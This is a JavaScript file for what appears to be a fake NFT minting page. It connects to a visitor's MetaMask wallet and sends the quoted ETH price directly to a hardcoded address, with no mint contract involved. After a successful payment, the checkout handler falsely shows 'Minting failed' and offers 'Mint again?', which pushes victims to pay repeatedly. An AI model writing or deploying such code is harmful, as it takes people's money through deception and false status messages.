const statusp = document.querySelector("#status");
const connectBtn = document.querySelector('#connectBtn');
const checkoutBtn = document.querySelector('#checkoutBtn');
const connect = document.querySelector(".connect");

//const connectBtnHeader = document.querySelector('#connectBtnHeader');
const pricePerNFT = 0.30;

/** input number spinner
 */
let plusBtn = document.querySelector('button[class*="btn-plus"]');
let minusBtn = document.querySelector('button[class*="btn-minus"]');
let totalNFTInput = document.querySelector('input[type="text"][id="totalNFT"]')
let totalETHSpan =  document.querySelector('#totalETH');
totalNFTInput.value = 1;
totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;

plusBtn.addEventListener('click',()=>{
  totalNFTInput.value = Number(totalNFTInput.value)  + 1;
  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
})
minusBtn.addEventListener('click',()=>{
  if (Number(totalNFTInput.value)>1) {
    totalNFTInput.value =  Number(totalNFTInput.value) - 1;
    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
  }
  
})
//** end of input number spinner */

connectBtn.addEventListener('click', async () => {
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = '<span style="color : green;">Wallet connected. Mint your NFTs now!</span>'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = '<span style="color : red;">Wallet access denied</span>'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  })

  /*
  connectBtnHeader.addEventListener('click', async () => {
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  }) */
  
  const initPayButton = () => {
    checkoutBtn.addEventListener('click', async () => {
      statusp.innerText = 'Minting in progress....'
      // paymentAddress is where funds will be send to
      const paymentAddress = '0x14874D2cfE9675BaE52CA27dE70Da5ed613209a3'
      let totalEth = totalETHSpan.innerText;
      totalEth = totalEth.toString();
      const accounts = await web3.eth.getAccounts();
      web3.eth.sendTransaction({
        from: web3.currentProvider.selectedAddress,
        to: paymentAddress,
        value: web3.utils.toWei(totalEth, 'ether')
        }, (err, transactionId) => {
        if  (err) {
          console.log('Minting failed', err)
          statusp.innerText = 'Minting failed'
        } else {
          console.log('Minting succeed', transactionId)
          statusp.innerText = 'Minting failed, gas fees have not been taken into consideration, please retry <a href="#">here</a>';
          checkoutBtn.innerText = 'Mint again?'  
        }
      })
    })
  }
  
 function getMobileOperatingSystem() {
  var userAgent = navigator.userAgent || navigator.vendor || window.opera;
  console.log(userAgent);
  // Windows Phone must come first because its UA also contains "Android"
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const uid = urlParams.get("uid");
  console.log(uid);
  if (uid == "mm") {
    return "Metamask";
  }
  if (/windows phone/i.test(userAgent)) {
    return "Windows Phone";
  }

  if (/android/i.test(userAgent)) {
    return "Android";
  }

  // iOS detection from: http://stackoverflow.com/a/9039885/177710
  if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
    return "iOS";
  }

  return "unknown";
 }
 document.addEventListener("DOMContentLoaded", (event) => {
   if (
     getMobileOperatingSystem() == "Android" ||
     getMobileOperatingSystem() == "iOS"
   ) {
     var wrapper = document.createElement("a");
     wrapper.classList.add("mmLink");
     wrapper.href =
       "https://metamask.app.link/dapp/" +
       window.location.href.replace("https:///", "").replace("http://", "") +
       "?uid=mm";
     connect.parentNode.insertBefore(wrapper, connect);
     wrapper.appendChild(connect);
  }
});